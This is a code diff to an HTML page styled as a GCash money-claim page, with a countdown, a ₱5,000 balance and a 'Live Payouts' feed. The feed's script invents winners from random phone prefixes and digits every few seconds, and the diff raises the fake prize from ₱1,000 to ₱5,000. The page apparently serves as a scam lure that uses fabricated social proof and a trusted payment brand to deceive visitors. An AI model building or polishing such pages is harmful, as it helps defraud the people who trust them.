@@ -39,11 +39,11 @@
         }
 
         h1 {
-            font-size: 18px;
+            font-size: 14px;
             color: #94a3b8;
             text-transform: uppercase;
             letter-spacing: 2px;
-            margin-top: 10px;
+            margin-bottom: 5px;
         }
 
         .amount {
@@ -74,8 +74,6 @@
             box-shadow: 0 8px 20px rgba(0, 125, 254, 0.4);
         }
 
-        .pay-button:disabled { background: #334155; cursor: not-allowed; box-shadow: none; }
-
         #timer-text { display: none; color: #ef4444; font-weight: 700; margin-top: 15px; font-size: 14px; }
 
         .promo-photo {
@@ -86,21 +84,26 @@
             border: 1px solid rgba(255,255,255,0.1);
         }
 
+        /* WINNERS LIST STYLING */
         .winners-container {
             background: rgba(0, 0, 0, 0.2);
             border: 1px solid rgba(255, 204, 0, 0.3);
             padding: 15px;
             border-radius: 16px;
-            margin: 25px 0;
+            margin-top: 25px;
             text-align: left;
         }
 
         .winners-container h3 {
-            font-size: 14px;
+            font-size: 12px;
             color: #fbbf24;
             margin-bottom: 12px;
             text-align: center;
             text-transform: uppercase;
+        }
+
+        #winners-list {
+            min-height: 50px; /* Ensures space is reserved */
         }
 
         .winner-item {
@@ -112,7 +115,6 @@
             justify-content: space-between;
             align-items: center;
             margin-bottom: 8px;
-            /* IBALIK ANG TRANSITION ANIMATION DITO */
             animation: slideIn 0.5s ease forwards;
         }
 
@@ -124,15 +126,11 @@
         .payout-green { color: #4ade80 !important; font-weight: 700; }
 
         .gcash-mini {
-            width: 22px !important;
-            height: 22px !important;
-            min-width: 22px !important;
-            min-height: 22px !important;
-            object-fit: cover;
+            width: 20px;
+            height: 20px;
             border-radius: 50%;
-            border: 1.5px solid #007dfe;
             background: white;
-            flex-shrink: 0;
+            border: 1px solid #007dfe;
         }
     </style>
 </head>
@@ -154,12 +152,12 @@
 
     <div class="winners-container">
         <h3>🔴 Live Payouts</h3>
-        <div id="winners-list"></div>
+        <div id="winners-list">
+            </div>
     </div>
 </div>
 
 <script>
-    // NUMBER ANIMATION LOGIC
     function animateValue(id, start, end, duration) {
         const obj = document.getElementById(id);
         let startTimestamp = null;
@@ -180,7 +178,7 @@
         const bal = document.getElementById('balanceText');
         const timerDiv = document.getElementById('timer-text');
 
-        animateValue("balanceText", 1000, 0, 800); 
+        animateValue("balanceText", 5000, 0, 800); 
         bal.style.color = "#64748b";
         bal.style.animation = "none";
 
@@ -205,7 +203,7 @@
             
             if (--timer < 0) {
                 clearInterval(interval);
-                animateValue("balanceText", 0, 1000, 1200); 
+                animateValue("balanceText", 0, 5000, 1200); 
                 const bal = document.getElementById('balanceText');
                 const btn = document.getElementById('claimBtn');
                 bal.style.color = "#4ade80";
@@ -217,33 +215,37 @@
         }, 1000);
     }
 
-    // ORIGINAL WINNER FUNCTION WITH GCASH ICON
     function generateWinner() {
         const prefixes = ['0917', '0922', '0998', '0905', '0916', '0945', '0966', '0935', '0906'];
         const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
         const lastThree = Math.floor(100 + Math.random() * 900);
-        const myGcashImage = "/images/gc_icon.png
-		";
+        
+        // FIXED: Removed the line break that was breaking the code
+        const myGcashImage = "images/gc_icon.png"; 
 
         const winnerEntry = document.createElement('div');
         winnerEntry.className = 'winner-item';
         winnerEntry.innerHTML = `
             <span>📱 ${randomPrefix}****${lastThree}</span>
-            <img src="${myGcashImage}" class="gcash-mini" alt="GCash">
-            <strong class="payout-green">+₱1,000</strong>
+            <img src="${myGcashImage}" class="gcash-mini" alt="GC">
+            <strong class="payout-green">+₱5,000</strong>
         `;
 
         const list = document.getElementById('winners-list');
         if (list) {
             list.prepend(winnerEntry);
-            if (list.children.length > 5) list.removeChild(list.lastChild);
+            if (list.children.length > 5) {
+                list.removeChild(list.lastChild);
+            }
         }
     }
 
-    generateWinner(); generateWinner();
+    // Initialize list
+    generateWinner();
+    generateWinner();
+    // Generate new ones every 3.5 seconds
     setInterval(generateWinner, 3500);
 </script>
 
-<script src="https://static.app/js/static.js" type="text/javascript"></script>
 </body>
 </html>
